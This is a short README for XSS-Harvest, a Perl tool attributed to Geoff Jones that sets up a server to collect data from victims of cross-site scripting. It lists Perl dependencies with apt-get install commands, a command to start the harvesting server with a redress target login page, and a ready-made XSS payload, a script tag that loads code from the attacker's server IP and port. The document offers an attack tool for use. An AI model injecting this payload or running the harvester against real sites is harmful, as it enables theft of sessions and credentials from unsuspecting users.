# XSS-Harvest
0.2.x

## CSS-Harvest is by Geoff Jones.
0x90.co.uk
http://www.0x90.co.uk/2011/07/harvesting-cross-site-scripting-xss.html

## Dependancies
Requires the following dependencies:
HTTP::Server::Simple::CGI, Digest::MD5, Time::Local, Getopt::Std, Net::Server::PreFork

sudo apt-get install libhttp-server-simple-perl
sudo apt-get install libdigest-md5-file-perl
sudo apt-get install libtime-local-perl
sudo apt-get install libnet-server-perl

## Usage
Start server (with redress:)
* ./xss-harvest.pl -l -r http://vulnerablepage.local/login.html

XSS:
* <script src="http://<serverip>:<serverport>/i"></script>
